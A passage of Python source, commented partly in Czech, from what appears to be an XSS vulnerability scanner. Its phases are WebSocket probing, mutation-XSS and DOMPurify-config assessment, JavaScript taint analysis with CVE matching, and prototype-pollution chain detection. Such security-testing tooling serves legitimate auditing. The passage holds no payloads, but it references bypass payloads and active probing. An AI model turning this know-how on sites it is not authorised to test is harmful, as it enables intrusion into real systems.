                # Validuj na target stránce
                ws_dyn = dynamic_websocket_scan(
                    target,
                    ws_endpoints=discovered_ws_urls,
                    wait_secs=dom_wait,
                    timeout_secs=dom_budget_secs,
                )
                websocket_dynamic_findings.extend(ws_dyn)

                for ws_d in ws_dyn:
                    if ws_d.get("triggered"):
                        sinks_str = ",".join(
                            s.get("sink", "?") for s in (ws_d.get("sinks_hit") or [])
                        )
                        cb["on_log"](
                            f"[WebSocket XSS] {target} | WS: {ws_d.get('ws_url', '?')} | "
                            f"sinks: {sinks_str}",
                            "info"
                        )
                        _emit_hit(cb, {
                            "url":      target,
                            "param":    f"WebSocket ({ws_d.get('ws_url', '?')})",
                            "context":  f"websocket-dynamic (sinks: {sinks_str})",
                            "csp_note": csp_affects_finding(csp_result, "dom"),
                            "status":   "DOM",
                            "source":   "websocket-dynamic",
                            "payload":  ws_d.get("payload", ""),
                            "dom_verified": True,
                        })
                        with found_lock:
                            found_params.add((target, "WebSocket"))
                        results.append({
                            "url":    target,
                            "param":  "WebSocket",
                            "status": "DOM",
                            "source": "websocket-dynamic",
                            "payload": ws_d.get("payload", ""),
                            "ws_url":  ws_d.get("ws_url", ""),
                            "sinks_hit": ws_d.get("sinks_hit", []),
                        })
        else:
            cb["on_log"]("WebSocket: no WS handlers found", "info")

      except Exception as e:
        cb["on_log"](f"[!] WebSocket phase crashed: {e}", "warn")

    # ════════════════════════════════════════════════════════════════════════
    # MUTATION XSS PHASE — static analysis of pages for sanitizer + innerHTML
    # ════════════════════════════════════════════════════════════════════════
    # We don't actively probe with mXSS payloads (needs Playwright with the
    # target's real sanitizer config — out of scope for HTTP-only scanner).
    # Instead we do a CHEAP STATIC ASSESSMENT: any page that loads DOMPurify
    # AND uses innerHTML is a candidate for manual mXSS verification.
    #
    # If risk_score >= 0.5, emit a finding so user knows to manually verify.
    # ════════════════════════════════════════════════════════════════════════
    if _MUTATION_XSS_AVAILABLE and not _cancelled.is_set():
        try:
            cb["on_log"]("Mutation XSS analysis (sanitizer + innerHTML pattern)...", "info")
            cb["on_phase"]("mutation_xss", {})

            # Analyze main page + all crawled pages
            mxss_pages_to_check = [target] + (pages[:50] if pages else [])  # v10.52: 30→50, cache-backed (free)
            mxss_seen: set = set()
            for mxss_url in mxss_pages_to_check:
                if _cancelled.is_set():
                    break
                if mxss_url in mxss_seen:
                    continue
                mxss_seen.add(mxss_url)
                try:
                    mxss_body = _crawl_html(mxss_url)   # v10.52: reuse crawl cache
                    if mxss_body is None:
                        continue
                    assess = _mx_static_assess(mxss_body)

                    if assess.risk_score >= 0.5:
                        san_name = (assess.sanitizer_info.sanitizer.value
                                    if assess.sanitizer_info else "unknown")
                        san_ver = (getattr(assess.sanitizer_info, "version", "")
                                   if assess.sanitizer_info else "")
                        finding = {
                            "url":                mxss_url,
                            "sanitizer":          san_name,
                            "sanitizer_version":  san_ver,
                            "innerhtml_sinks":    assess.innerhtml_sinks,
                            "risk_score":         assess.risk_score,
                            "rationale":          assess.rationale,
                            "recommendation":     ("Verify with headless probe: feed each "
                                                   "_mutation_xss.payload_bank() entry into the "
                                                   "live sanitizer + innerHTML and check for exec."),
                        }
                        mutation_xss_findings.append(finding)

                        # Emit as finding via _emit_hit pipeline (uses dedup + GUI)
                        # so user sees it in tabulka
                        _emit_hit(cb, {
                            "url":      mxss_url,
                            "param":    f"page (sanitizer:{san_name})",
                            "context":  f"mutation-xss-static (risk={assess.risk_score:.2f})",
                            "csp_note": "",
                            # v10.52 refactor: _crawl_html returns only the body
                            # (from the crawl cache) and only for status < 400 —
                            # there is no response object here. The old mxss_resp
                            # is gone; referencing it raised NameError that the
                            # surrounding except swallowed, so this finding never
                            # reached _emit_hit (no GUI row / log / active probe).
                            "status":   200,
                            "source":   "mutation-xss-static",
                            "payload":  f"sanitizer={san_name} innerhtml_sinks={assess.innerhtml_sinks}",
                            "mxss_finding": finding,
                        }, body=mxss_body, resp_headers=None)
                        cb["on_log"](
                            f"[mXSS] {mxss_url} → sanitizer:{san_name} "
                            f"+ {assess.innerhtml_sinks} innerHTML sinks (risk={assess.risk_score:.2f})",
                            "info"
                        )
                except Exception:
                    continue

            mxss_count = len(mutation_xss_findings)
            if mxss_count:
                cb["on_log"](
                    f"[OK] Mutation XSS analysis: {mxss_count} pages with the sanitizer+innerHTML pattern. "
                    f"Manual verification with the payload bank from _mutation_xss.py is recommended.",
                    "info"
                )
            else:
                cb["on_log"]("Mutation XSS: no risky pages (no sanitizer+innerHTML pattern)", "info")

        except Exception as e:
            cb["on_log"](f"[!] Mutation XSS phase crashed: {e}", "warn")
    elif not _MUTATION_XSS_AVAILABLE:
        cb["on_log"]("Mutation XSS: module _mutation_xss.py unavailable — skip", "debug")

    # ════════════════════════════════════════════════════════════════════════
    # DOMPURIFY CONFIG PHASE (v10.70, opt-in) — config-aware sanitizer bypass
    # ════════════════════════════════════════════════════════════════════════
    # Version-based CVEs are one thing; the DOMINANT real DOMPurify bypass is the
    # app weakening its OWN config (ADD_TAGS / ADD_ATTR on*= / ALLOW_UNKNOWN_
    # PROTOCOLS / ADD_URI_SAFE_ATTR / USE_PROFILES). Static, page-level, uses the
    # crawl cache (zero extra requests). Option NAMES are DOMPurify-specific → low
    # FP; only genuinely dangerous values are reported.
    if enable_dompurify_config_scan and _DOMPURIFY_CONFIG_AVAILABLE and not _cancelled.is_set():
        try:
            cb["on_phase"]("dompurify_config", {})
            _dpc_pages = [target] + (pages[:50] if pages else [])
            _dpc_seen: set = set()
            _dpc_hits = 0
            for _dpc_url in _dpc_pages:
                if _cancelled.is_set():
                    break
                if _dpc_url in _dpc_seen:
                    continue
                _dpc_seen.add(_dpc_url)
                try:
                    _dpc_body = _crawl_html(_dpc_url)  # crawl cache (free)
                    if not _dpc_body:
                        continue
                    for _dpf in _dpc_scan(_dpc_body, _dpc_url):
                        _emit_hit(cb, _dpf)
                        _dpc_hits += 1
                        cb["on_log"](
                            f"[DOMPURIFY-CFG] {_dpc_url[:70]} → "
                            f"{_dpf['option']}:{_dpf['detail']} "
                            f"({_dpf['severity']})", "warning")
                except Exception as _dpe:
                    logging.debug(f"[DOMPURIFY-CFG] scan failed {_dpc_url}: {_dpe}")
            cb["on_log"](
                f"[OK] DOMPurify-config scan done: {_dpc_hits} dangerous options",
                "info")
        except Exception as _dpce:
            cb["on_log"](f"[!] DOMPurify-config phase crashed: {_dpce}", "warn")

    # ════════════════════════════════════════════════════════════════════════
    # SKLIDIT template_injection FINDINGS Z RESULTS
    # ════════════════════════════════════════════════════════════════════════
    # worker_task ukládá template_injection do hit dictu pro každý vyhovující
    # nález. Tady je sebeřeme do samostatné kolekce pro JSON report a final
    # log.
    # ════════════════════════════════════════════════════════════════════════
    for r in results:
        ti = r.get("template_injection")
        if ti:
            template_injection_findings.append({
                "url":               r.get("url"),
                "param":             r.get("param"),
                "framework":         ti.get("framework"),
                "version":           ti.get("version"),
                "expression_context":ti.get("expression_context"),
                "rationale":         ti.get("rationale"),
                "probe_payload":     ti.get("probe_payload"),
                "ti_confidence":     ti.get("ti_confidence"),
                "fw_confidence":     ti.get("fw_confidence"),
            })
    if template_injection_findings:
        cb["on_log"](
            f"[OK] Template injection: {len(template_injection_findings)} findings "
            f"(viz JSON report sekce 'template_injection_findings')",
            "info"
        )

    # ════════════════════════════════════════════════════════════════════════
    # STATIC JS ANALYZER PHASE — AST taint flow bez runtime exekuce
    # ════════════════════════════════════════════════════════════════════════
    # Pro každou crawlovanou stránku:
    #   1. Stáhni HTML (už máme z crawl fáze)
    #   2. Extrahuj inline <script> bloky → analyzuj
    #   3. Extrahuj <script src="..."> URLs → fetch (cached) → analyzuj
    #   4. Findings: source.<chain>.sink chains s lokací (file:line:col)
    #
    # Najde:
    #   - DOM XSS v JS souborech které ještě nebyly načteny
    #   - DOM XSS v code paths které headless nedosáhne (auth, action-gated)
    #   - Pre-emptive findings před runtime fází
    #
    # Cost: ~ms na inline script, ~10-50ms na externí JS (síť dominuje).
    # ════════════════════════════════════════════════════════════════════════
    static_js_findings: List[Dict] = []
    # v10.16: library/framework CVE nálezy (z CVE feedu nad staženými JS +
    # HTML markery). Dedup podle (library, version), ať se stejná knihovna
    # nehlásí na každé stránce znovu.
    library_cve_findings: List[Dict] = []
    # v10.73: basenames of JS files the CVE feed already flagged. Used to
    # SUPPRESS the redundant library-internal static-js/PP chains for the same
    # file from primary results (the CVE finding is the canonical "this vendor
    # lib is vulnerable" signal; the internal chain adds noise, not signal).
    _cve_lib_files: set = set()
    _lcf_seen: set = set()
    if (_STATIC_JS_AVAILABLE and static_js and not _cancelled.is_set()
            and _phase_target_alive("STATIC-JS")):
        try:
            cb["on_log"]("Static JS taint analysis (esprima AST)...", "info")
            cb["on_phase"]("static_js", {})

            # Vezmi target + crawled pages, max N
            MAX_STATIC_JS_PAGES = 50
            sjs_pages_seen: set = set()
            sjs_pages_to_check: List[str] = [target]
            sjs_pages_seen.add(_normalize_endpoint(target))
            for u in (pages or []):
                if _cancelled.is_set():
                    break
                ne = _normalize_endpoint(u)
                if ne in sjs_pages_seen:
                    continue
                sjs_pages_seen.add(ne)
                sjs_pages_to_check.append(u)
                if len(sjs_pages_to_check) >= MAX_STATIC_JS_PAGES:
                    break

            # Cache pro externí JS — stejný .js může být referencovaný
            # více stránkami, fetchuj jen jednou
            external_js_cache: Dict[str, str] = {}
            external_js_seen: Set[str] = set()
            MAX_EXTERNAL_JS = 30   # cap external JS files

            cb["on_log"](
                f"[STATIC-JS] {len(sjs_pages_to_check)} pages to analyze",
                "info"
            )

            for idx, page_url in enumerate(sjs_pages_to_check):
                if _cancelled.is_set():
                    break
                cb["on_progress"](idx + 1, len(sjs_pages_to_check))
                try:
                    # v10.52: reuse the crawl-time HTML cache (the crawler already
                    # downloaded these pages); only fetch on a cache miss.
                    html = _crawl_html(page_url)
                    if not html:
                        continue

                    # v10.16: HTML-based framework detekce (Angular 2+ ng-version,
                    # Next.js) — verze SPA frameworků žijí v HTML, ne v názvu JS.
                    if _LIBRARY_CVE_AVAILABLE and _lcf_audit_html:
                        try:
                            for _fa in _lcf_audit_html(html):
                                if _fa.get("cve_count", 0) <= 0:
                                    continue
                                _k = (_fa["library"], _fa["version"])
                                if _k in _lcf_seen:
                                    continue
                                _lcf_seen.add(_k)
                                library_cve_findings.append(_fa)
                                _cves = ", ".join(
                                    c["cve"] for c in _fa["matched_cves"])
                                cb["on_log"](
                                    f"[CVE] {_fa['library']} {_fa['version']} "
                                    f"→ {_cves} ({_fa['max_severity']})", "warning")
                                _emit_hit(cb, {
                                    "url": page_url,
                                    "param": f"{_fa['library']}@{_fa['version']}",
                                    "context": "vulnerable-library",
                                    "source": "library-cve",
                                    "severity": _fa["max_severity"],
                                    "cwe_hint": "CWE-1395",
                                    "library_audit": _fa,
                                    "evidence": _cves,
                                })
                        except Exception as _ce:
                            logging.debug(f"[CVE] html audit failed: {_ce}")

                    # 1) Inline <script> blocky
                    inline_findings = _sjs_analyze_html(html,
                                                          page_url=page_url)
                    for f in inline_findings:
                        finding_dict = {
                            "url":         page_url,
                            "source":      f.source_name,
                            "sink":        f.sink_name,
                            "severity":    f.severity,
                            "confidence":  f.confidence,
                            "file":        f.file,
                            "line":        f.line,
                            "col":         f.col,
                            "snippet":     f.snippet,
                            "chain":       [(label, line) for label, line in f.chain],
                            "origin":      "inline",
                        }
                        static_js_findings.append(finding_dict)

                    # 2) Externí <script src="..."> soubory
                    if _sjs_external_urls and len(external_js_seen) < MAX_EXTERNAL_JS:
                        ext_urls = _sjs_external_urls(html, base_url=page_url)
                        for js_url in ext_urls:
                            if js_url in external_js_seen:
                                continue
                            if len(external_js_seen) >= MAX_EXTERNAL_JS:
                                break
                            external_js_seen.add(js_url)
                            try:
                                js_resp = session_workers.get(
                                    js_url, timeout=timeout,
                                    allow_redirects=True
                                )
                                if (js_resp is None
                                        or js_resp.status_code >= 400):
                                    continue
                                js_code = js_resp.text or ""
                                external_js_cache[js_url] = js_code
                                # v10.16: CVE audit staženého JS souboru
                                if _LIBRARY_CVE_AVAILABLE and _lcf_audit_file:
                                    try:
                                        _audit = _lcf_audit_file(js_url, js_code)
                                        if _audit and _audit.get("cve_count", 0) > 0:
                                            _k = (_audit["library"], _audit["version"])
                                            if _k not in _lcf_seen:
                                                _lcf_seen.add(_k)
                                                library_cve_findings.append(_audit)
                                                try:
                                                    _cve_lib_files.add(
                                                        js_url.rsplit("/", 1)[-1]
                                                        .split("?")[0].split("#")[0].lower())
                                                except Exception:
                                                    pass
                                                _cves = ", ".join(
                                                    c["cve"] for c in _audit["matched_cves"])
                                                cb["on_log"](
                                                    f"[CVE] {_audit['library']} "
                                                    f"{_audit['version']} → {_cves} "
                                                    f"({_audit['max_severity']})",
                                                    "warning")
                                                # emituj jako finding
                                                _emit_hit(cb, {
                                                    "url": js_url,
                                                    "param": f"{_audit['library']}@{_audit['version']}",
                                                    "context": "vulnerable-library",
                                                    "source": "library-cve",
                                                    "severity": _audit["max_severity"],
                                                    "cwe_hint": "CWE-1395",
                                                    "library_audit": _audit,
                                                    "evidence": _cves,
                                                })
                                    except Exception as _ce:
                                        logging.debug(f"[CVE] audit failed {js_url}: {_ce}")
                                ext_findings = _sjs_analyze_source(
                                    js_code, source_name=js_url
                                )
                                for f in ext_findings:
                                    static_js_findings.append({
                                        "url":         page_url,
                                        "source":      f.source_name,
                                        "sink":        f.sink_name,
                                        "severity":    f.severity,
                                        "confidence":  f.confidence,
                                        "file":        f.file,
                                        "line":        f.line,
                                        "col":         f.col,
                                        "snippet":     f.snippet,
                                        "chain":       [(lbl, ln) for lbl, ln in f.chain],
                                        "origin":      "external",
                                    })

                                # v10.51: source-map de-minification. If the
                                # bundle ships a map with sourcesContent, recover
                                # the ORIGINAL source and run the same taint
                                # analyzer on it — minification hid the structure
                                # that proves source→sink. Findings join the same
                                # static_js_findings list (origin="sourcemap").
                                if (enable_sourcemap and _SOURCEMAP_AVAILABLE
                                        and not _cancelled.is_set()):
                                    try:
                                        _orig_sources = _sm_deminify(
                                            session_workers, js_code, js_url,
                                            timeout, follow_redirects,
                                            response_headers=dict(js_resp.headers))
                                    except Exception as _sme:
                                        logging.debug(
                                            f"[SOURCEMAP] deminify failed "
                                            f"{js_url}: {_sme}")
                                        _orig_sources = []
                                    if _orig_sources:
                                        cb["on_log"](
                                            f"[SOURCEMAP] {js_url[:60]} → "
                                            f"{len(_orig_sources)} original "
                                            f"source(s) recovered", "info")
                                    for _src_name, _src_code in _orig_sources:
                                        if _cancelled.is_set():
                                            break
                                        try:
                                            _sm_findings = _sjs_analyze_source(
                                                _src_code, source_name=_src_name)
                                        except Exception:
                                            continue
                                        for f in _sm_findings:
                                            static_js_findings.append({
                                                "url":         page_url,
                                                "source":      f.source_name,
                                                "sink":        f.sink_name,
                                                "severity":    f.severity,
                                                "confidence":  f.confidence,
                                                "file":        f.file or _src_name,
                                                "line":        f.line,
                                                "col":         f.col,
                                                "snippet":     f.snippet,
                                                "chain":       [(lbl, ln) for lbl, ln in f.chain],
                                                "origin":      "sourcemap",
                                                "bundle_url":  js_url,
                                            })
                            except Exception:
                                continue

                except Exception as e:
                    cb["on_log"](
                        f"[STATIC-JS] error on {page_url[:80]}: "
                        f"{type(e).__name__}: {e}",
                        "warn"
                    )

            # Emit high/critical findings přes _emit_hit pro GUI viditelnost
            # v10.8: classify each finding as library vs application code.
            # Library findings get severity demoted to "info" + library_audit=True
            # flag for routing to separate Library Audit tab.
            high_count = 0
            library_count = 0
            for f in static_js_findings:
                file_str = f.get("file", "") or ""
                file_short = file_str.rsplit("/", 1)[-1] if "/" in file_str else file_str
                # v10.8: detect library code paths
                is_library = _is_library_path(file_str)
                if is_library:
                    # Mutate finding in place — flag and demote severity
                    f["library_audit"] = True
                    f["original_severity"] = f.get("severity", "high")
                    f["severity"] = "info"
                    library_count += 1
                else:
                    f["library_audit"] = False

                # Emit application-code findings as primary hits (original severity)
                # Library findings still emitted but with severity=info, GUI can
                # filter/route them
                if f["library_audit"] or f["severity"] in ("critical", "high"):
                    _dedup_over = None
                    if f["library_audit"]:
                        # v10.73 FP-cut: a vendor lib embedded on N pages used to
                        # emit N identical findings AND duplicate the CVE feed.
                        # Suppress from primary results when the CVE feed already
                        # flags this exact file (kept in static_js_findings for the
                        # Library Audit view); else dedup on the FILE, not the page.
                        if file_short.lower() in _cve_lib_files:
                            continue
                        _dedup_over = f"lib:{file_short.lower()}"
                    else:
                        high_count += 1
                    payload_label = (
                        f"static-js {f['source']} → {f['sink']} "
                        f"@ {file_short}:{f['line']}"
                        + (" [LIBRARY AUDIT]" if f["library_audit"] else "")
                    )
                    _emit_hit(cb, {
                        "url":      f["url"],
                        "param":    f"JS:{file_short}",
                        "context":  f"static-js-taint ({f['severity']})",
                        "csp_note": "",
                        "status":   "STATIC",
                        "source":   "static-js",
                        "payload":  payload_label,
                        "dedup_url": _dedup_over,
                        "static_js_finding": f,
                    })

            # Souhrnný log
            sev_counts = {}
            for f in static_js_findings:
                sev_counts[f["severity"]] = sev_counts.get(f["severity"], 0) + 1
            cb["on_log"](
                f"[STATIC-JS] done: {len(static_js_findings)} findings "
                f"({dict(sev_counts) if sev_counts else 'none'}), "
                f"{len(external_js_seen)} external JS files analyzed"
                + (f", {library_count} library-only (Library Audit tab)"
                   if library_count > 0 else ""),
                "info"
            )
            for f in static_js_findings[:5]:
                if f["severity"] in ("critical", "high"):
                    cb["on_log"](
                        f"[STATIC-JS] 🚨 {f['source']} → {f['sink']} "
                        f"@ {f['file']}:{f['line']} ({f['severity']})",
                        "info"
                    )

        except Exception as e:
            cb["on_log"](f"[!] Static JS phase crashed: {e}", "warn")

    elif not _STATIC_JS_AVAILABLE and static_js:
        cb["on_log"](
            "Static JS analyzer: modul _static_js_analyzer.py / esprima "
            "not available — skipped", "info"
        )

    # ════════════════════════════════════════════════════════════════════════
    # PROTOTYPE POLLUTION → XSS CHAIN PHASE (v10 — DOMPurify CVE feed)
    # ════════════════════════════════════════════════════════════════════════
    # Pro každou crawlovanou stránku:
    #   1. Stáhni HTML + extrahuj inline <script> + externí .js
    #   2. AST audit: najdi pollution SOURCES (recursive merge funkce s user
    #      input), pollution GADGETS (známé exploitable property names),
    #      DOMPurify dependency a její verzi
    #   3. Chain detection:
    #      - source + gadget v stejné stránce = HIGH (klasický PP→XSS)
    #      - source + DOMPurify s known CVE = SEVERITY z CVE feedu
    #        (v10.10: data-driven — _dompurify_cve_feed.py obsahuje
    #         CVE-2024-47875, CVE-2025-26791, CVE-2026-41238 a budoucí CVEs.
    #         1 dep ve vulnerable range může matchovat víc CVEs → víc findings.)
    #      - jen gadget bez source = INFO (suspicious)
    # Cost: ~ms/page (pure offline AST, žádné runtime).
    # ════════════════════════════════════════════════════════════════════════
    proto_pollution_findings: List[Dict] = []
    if (_PROTO_POLLUTION_AVAILABLE and proto_pollution
            and not _cancelled.is_set()
            and _phase_target_alive("PP")):
        try:
            cb["on_log"]("Prototype Pollution → XSS chain audit...", "info")
            cb["on_phase"]("proto_pollution", {})

            # v10.8: Aggregation map for smart dedup. Same source pattern
            # appearing across N pages = 1 logical finding, not N hits.
            # Key: (source_pattern, source_file, source_line, kind).
            # Value: {"finding": dict, "affects_pages": [list]}
            pp_aggregation: Dict[Tuple, Dict] = {}

            MAX_PP_PAGES = 50
            pp_pages_seen: set = set()
            pp_pages_to_check: List[str] = [target]
            pp_pages_seen.add(_normalize_endpoint(target))
            for u in (pages or []):
                if _cancelled.is_set():
                    break
                ne = _normalize_endpoint(u)
                if ne in pp_pages_seen:
                    continue
                pp_pages_seen.add(ne)
                pp_pages_to_check.append(u)
                if len(pp_pages_to_check) >= MAX_PP_PAGES:
                    break

            cb["on_log"](
                f"[PP] {len(pp_pages_to_check)} pages to audit", "info"
            )

            pp_external_js_seen: Set[str] = set()
            MAX_PP_EXTERNAL_JS = 30
            chains_found = 0
            cve_chains_found = 0
            total_sources = 0
            total_gadgets = 0
            vuln_dompurify_found = 0

            for idx, page_url in enumerate(pp_pages_to_check):
                if _cancelled.is_set():
                    break
                cb["on_progress"](idx + 1, len(pp_pages_to_check))
                try:
                    resp = session_workers.get(
                        page_url, timeout=timeout, allow_redirects=True
                    )
                    if resp is None or resp.status_code >= 400:
                        continue
                    html = resp.text or ""
                    if not html:
                        continue

                    # Collect inline scripts
                    inline_bodies: List[str] = []
                    if _sjs_analyze_html and html:
                        from _static_js_analyzer import extract_inline_scripts
                        for body, _line in extract_inline_scripts(html):
                            inline_bodies.append(body)

                    # Collect external .js (capped)
                    external_sources: Dict[str, str] = {}
                    if _sjs_external_urls:
                        ext_urls = _sjs_external_urls(html, base_url=page_url)
                        for js_url in ext_urls:
                            if js_url in pp_external_js_seen:
                                continue
                            if len(pp_external_js_seen) >= MAX_PP_EXTERNAL_JS:
                                break
                            pp_external_js_seen.add(js_url)
                            try:
                                jr = session_workers.get(
                                    js_url, timeout=timeout, allow_redirects=True
                                )
                                if jr is None or jr.status_code >= 400:
                                    continue
                                external_sources[js_url] = jr.text or ""
                            except Exception:
                                continue

                    # Build pollution report for this page
                    report = _pp_build_report(
                        url=page_url,
                        inline_scripts=inline_bodies,
                        external_scripts=external_sources,
                    )
                    total_sources += len(report.sources)
                    total_gadgets += len(report.gadgets)

                    # Track vulnerable DOMPurify
                    vuln_dp = [d for d in report.dompurify_deps if d.is_vulnerable]
                    vuln_dompurify_found += len(vuln_dp)

                    # Chain detection — pair sources with gadgets / vuln-DOMPurify
                    if report.sources:
                        # CASE 1: source + vulnerable DOMPurify = CVE chain
                        # v10.10: data-driven — emits 1 finding per matched CVE,
                        # not just CVE-2026-41238. Single dep with version 3.0.5
                        # may match 3 CVEs (47875, 26791, 41238) → 3 findings.
                        if vuln_dp:
                            for src in report.sources:
                                for dp in vuln_dp:
                                    matched = dp.matched_cves or []
                                    if not matched:
                                        # No specific CVE info but flagged vulnerable
                                        # (legacy fallback) — emit generic
                                        matched = [{
                                            "cve": "CVE-2026-41238",
                                            "severity": "critical",
                                            "vector": "prototype-pollution-bypass",
                                            "description": "(no CVE feed data)",
                                            "bypass_payload": "",
                                            "reference": "",
                                        }]
                                    for cve_info in matched:
                                        cve_id = cve_info.get("cve", "DOMPURIFY-CVE")
                                        cve_sev = cve_info.get("severity", "high")
                                        cve_vector = cve_info.get("vector", "?")
                                        cve_desc = cve_info.get("description", "")
                                        cve_payload = cve_info.get("bypass_payload", "")
                                        cve_ref = cve_info.get("reference", "")
                                        cve_chains_found += 1
                                        # finding-kind matches the CVE id (slugified)
                                        kind_id = cve_id.lower().replace("_", "-")
                                        # v10.24 (FP gate — CASE 1): ko-lokace
                                        # pollution-source + zranitelná verze
                                        # DOMPurify NENÍ potvrzený řetězec.
                                        # Pollution → vnitřek DOMPurify je
                                        # black-box; staticky se def-use hrana
                                        # NEdá ověřit. Dřív se emitovalo na
                                        # nativní severitě CVE (critical/high)
                                        # čistě na ko-lokaci → FP. Nově: info +
                                        # fp_risk, s CVE severitou zachovanou
                                        # jako potential_severity (signál se
                                        # neztratí, ale nepromuje se na váhu).
                                        finding_dict = {
                                            "url":            page_url,
                                            "kind":           kind_id,
                                            "cve":            cve_id,
                                            "cve_vector":     cve_vector,
                                            "cve_description": cve_desc,
                                            "cve_payload":    cve_payload,
                                            "cve_reference":  cve_ref,
                                            "severity":          "info",
                                            "potential_severity": cve_sev,
                                            "chain_verified":    False,
                                            "fp_risk":           True,
                                            "fp_reason": (
                                                "co-located prototype-pollution "
                                                "source + vulnerable DOMPurify "
                                                "version; pollution→sanitize "
                                                "data-flow NOT statically "
                                                "verifiable (library internals "
                                                "are black-box) — manual / "
                                                "runtime verification REQUIRED "
                                                "before treating as exploitable"),
                                            "source_pattern": src.pattern,
                                            "source_file":    src.file,
                                            "source_line":    src.line,
                                            "source_origin":  src.arg_origin,
                                            "dompurify_version": dp.version or "<unknown>",
                                            "dompurify_file": dp.file,
                                            "snippet":        src.snippet,
                                        }
                                        proto_pollution_findings.append(finding_dict)
                                        # Aggregation key includes CVE so different
                                        # CVEs on same source = separate findings
                                        agg_key = (
                                            src.pattern, src.file, src.line,
                                            kind_id,
                                        )
                                        if agg_key not in pp_aggregation:
                                            pp_aggregation[agg_key] = {
                                                "finding": finding_dict,
                                                "affects_pages": [],
                                            }
                                        if page_url not in pp_aggregation[agg_key]["affects_pages"]:
                                            pp_aggregation[agg_key]["affects_pages"].append(page_url)
                                        # NOTE: emit moved to after-loop aggregated emit
                                        # v10.20 fix: src_short se dřív v CASE 1
                                        # NEPŘIŘAZOVALO (definováno jen v pozdějších
                                        # větvích), takže tenhle log řádek házel
                                        # NameError → chycen phase try/except →
                                        # after-loop emit přeskočen → reálný CVE
                                        # chain se tiše ztratil. Definujeme lokálně.
                                        src_short = (src.file.rsplit("/", 1)[-1]
                                                     if src.file else "?")
                                        cb["on_log"](
                                            f"[PP] ⚠ potential {cve_id} lead "
                                            f"(info, fp_risk; potential "
                                            f"{cve_sev}): {src.pattern} + "
                                            f"DOMPurify {dp.version or '?'} "
                                            f"@ {src_short}:{src.line} "
                                            f"— flow NOT verified",
                                            "info"
                                        )
                        # CASE 2: source + gadget = generic PP→XSS chain
                        if report.gadgets:
                            # Pair only highest-severity gadget per source to limit FP
                            best_gadget = max(
                                report.gadgets,
                                key=lambda g: ({"critical": 3, "high": 2,
                                                "medium": 1}.get(g.severity, 0),
                                               g.confidence)
                            )
                            for src in report.sources:
                                chains_found += 1
                                # v10.18 (FP#1 confirmation gate): rozliš
                                # OVĚŘENÝ řetězec od pouhé KO-LOKACE. Dřív se
                                # source + gadget na téže stránce hlásil jako
                                # HIGH bez ověření, že mezi zápisem (pollution)
                                # a čtením (gadget) existuje reálná def-use
                                # hrana. To dělalo false-positivy. Bez ověřené
                                # hrany (nebo runtime potvrzení) je to nanejvýš
                                # INFO/LOW — "potenciální", ne potvrzené.
                                # v10.24 (FP gate — zpřísnění): heuristika
                                # _pp_chain_has_verified_edge JEN potvrzuje
                                # ko-lokaci se silnými constrainty (user-input
                                # source + dosažitelný sink + stejný soubor) —
                                # NEdokazuje, že gadget čte PRÁVĚ tu polluted
                                # property. To není def-use důkaz. Bez RUNTIME
                                # potvrzení proto NIKDY nepromuj na high/medium.
                                _static_edge = _pp_chain_has_verified_edge(
                                    src, best_gadget)
                                # potential_severity = co by to bylo PŘI
                                # potvrzeném flow (zachová se pro triage/ML)
                                if best_gadget.severity == "critical":
                                    _potential_sev = "high"
                                elif (src.severity == "high"
                                        and best_gadget.severity == "high"):
                                    _potential_sev = "high"
                                else:
                                    _potential_sev = "medium"
                                # Silný statický signál → low; slabý → info.
                                # OBOJÍ fp_risk (flow neověřen runtime).
                                if _static_edge:
                                    final_sev = "low"
                                    _fp_reason = (
                                        "strong static co-location (user-input "
                                        "source + reachable sink, same file) "
                                        "but polluted-property→sink data-flow "
                                        "NOT runtime-confirmed — possible FP, "
                                        "manual/runtime verify")
                                else:
                                    final_sev = "info"
                                    _fp_reason = (
                                        "co-located source+gadget without a "
                                        "verified data-flow edge — potential, "
                                        "not confirmed (manual/runtime verify)")
                                finding_dict = {
                                    "url":            page_url,
                                    "kind":           "chain",
                                    "severity":          final_sev,
                                    "potential_severity": _potential_sev,
                                    "chain_verified":    False,
                                    "static_signal":     ("strong" if _static_edge
                                                          else "weak"),
                                    "fp_risk":           True,
                                    "fp_reason":         _fp_reason,
                                    "source_pattern": src.pattern,
                                    "source_file":    src.file,
                                    "source_line":    src.line,
                                    "source_origin":  src.arg_origin,
                                    "gadget_property": best_gadget.property_name,
                                    "gadget_kind":    best_gadget.sink_kind,
                                    "gadget_file":    best_gadget.file,
                                    "gadget_line":    best_gadget.line,
                                    "gadget_severity": best_gadget.severity,
                                    "snippet":        src.snippet,
                                }
                                # v10.8: aggregate by (source_pattern, file, line, kind)
                                agg_key = (
                                    src.pattern, src.file, src.line,
                                    "chain",
                                )
                                if agg_key not in pp_aggregation:
                                    pp_aggregation[agg_key] = {
                                        "finding": finding_dict,
                                        "affects_pages": [],
                                    }
                                if page_url not in pp_aggregation[agg_key]["affects_pages"]:
                                    pp_aggregation[agg_key]["affects_pages"].append(page_url)
                                # NOTE: emit moved to after-loop aggregated emit
                                src_short = (src.file.rsplit("/", 1)[-1]
                                             if "/" in src.file else src.file)
                                gad_short = (best_gadget.file.rsplit("/", 1)[-1]
                                             if "/" in best_gadget.file else best_gadget.file)
                                payload_label_unused = (
                                    f"PP chain: {src.pattern} @ {src_short}:{src.line} "
                                    f"→ gadget '{best_gadget.property_name}' "
                                    f"({best_gadget.sink_kind}) "
                                    f"@ {gad_short}:{best_gadget.line}"
                                )

                except Exception as e:
                    cb["on_log"](
                        f"[PP] error on {page_url[:80]}: "
                        f"{type(e).__name__}: {e}", "warn"
                    )

            # ── v10.8: After-loop aggregated emit ──
            # Same source pattern across N pages = 1 hit, not N hits.
            # We emit once per (source_pattern, source_file, source_line, kind)
            # with affects_pages list. Reduces noise in GUI by 5-10x for sites
            # using shared JS bundles.
            # ── v10.9: ALSO classify library code → severity demote + reroute ──
            # PP findings in vendor jQuery/lodash/owl.carousel etc. are
            # supply chain audit material, not application bugs. Apply same
            # _is_library_path() heuristic as static-js phase. Library findings
            # get library_audit=True flag → routed to Library Audit tab in GUI.
            pp_lib_count = 0
            pp_app_count = 0
            for agg_key, agg in pp_aggregation.items():
                finding_dict = dict(agg["finding"])  # copy
                affects = agg["affects_pages"]
                finding_dict["affects_pages"] = affects
                finding_dict["affects_count"] = len(affects)
                # Use first affected page as canonical URL
                first_url = affects[0] if affects else finding_dict.get("url", "")
                kind = finding_dict.get("kind", "chain")
                src_pat = finding_dict.get("source_pattern", "?")
                src_file = finding_dict.get("source_file", "?")
                src_line = finding_dict.get("source_line", 0)
